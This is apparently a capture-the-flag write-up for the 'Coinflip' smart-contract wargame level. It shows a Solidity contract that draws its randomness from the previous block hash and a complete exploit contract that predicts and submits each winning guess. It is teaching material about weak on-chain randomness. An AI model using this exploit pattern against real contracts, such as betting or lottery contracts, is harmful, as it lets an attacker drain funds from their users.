
# Coinflip - Public Information & Scripting
---

## Challenge Description

> This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

we can see that the challenge is about predicting the coinflip output, lets look at the coinflip contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## Solution

we can see that the side of the coinflip is determined by a calculation involving the hash of the last block and the factor constant declared above.

If so, how could we predict the side of the coinflip when we call the function?
We can mimic the same mathematical computation and get the result of the flip even before we call it. Lets build a contract that will do it!

First we declare on the CoinFlip Interface so we could call the flip function easily:

```solidity
interface Coinflip {
	function flip(bool _guess) external returns(bool);
}
```

Then we create our exploit contract: 

```solidity
contract CoinFlipExploit {
	uint256 public consecutiveWins = 0;
	uint256 public lastBlockNumber = 0;
	
	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
	
	address remoteContractAddress = 0xfeBCa7396C600D4CDc8a6c86F20923c95f5282BC;
```
We have one variable that will keep track of the number of wins we got, and the second one will keep track of the last block we called the flip transaction on. (because the Coinflip contract checks it)
In addition we declare on the factor that we will use in our calculations and on the address of the CoinFlip contract.

Now lets dive into the exploit function:

```solidity
function flip_exploit() public {
	Coinflip remoteContract = Coinflip(remoteContractAddress);
	while (lastBlockNumber == block.number) {
	}
	
	lastBlockNumber = block.number;
	uint256 blockValue = uint256(blockhash(block.number - 1));
	uint256 coinFlip = blockValue / FACTOR;
	bool side = coinFlip == 1 ? true : false;
	bool succeeded = remoteContract.flip(side);
	
	if (succeeded) {
		consecutiveWins++;
	}
}
```

We first make connection with the CoinFlip contract, wait so we will not be on the same block as the last one we flipped on, and then we mimic the calculation of the CoinFlip contract and send the already computed result to the flip function in the CoinFlip contract.
Repeat the process 10 times and the level is completed.

## Final Code

``` solidity
pragma solidity ^0.8.0;

interface Coinflip {
	function flip(bool _guess) external returns(bool);
}

contract CoinFlipExploit {
	uint256 public consecutiveWins = 0;
	uint256 public lastBlockNumber = 0;
	
	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
	
	address remoteContractAddress = 0xfeBCa7396C600D4CDc8a6c86F20923c95f5282BC;
	
	function flip_exploit() public {
		Coinflip remoteContract = Coinflip(remoteContractAddress);
		while (lastBlockNumber == block.number) {
		}
		
		lastBlockNumber = block.number;
		uint256 blockValue = uint256(blockhash(block.number - 1));
		uint256 coinFlip = blockValue / FACTOR;
		bool side = coinFlip == 1 ? true : false;
		bool succeeded = remoteContract.flip(side);
		
		if (succeeded) {
			consecutiveWins++;
		}
	}
}
```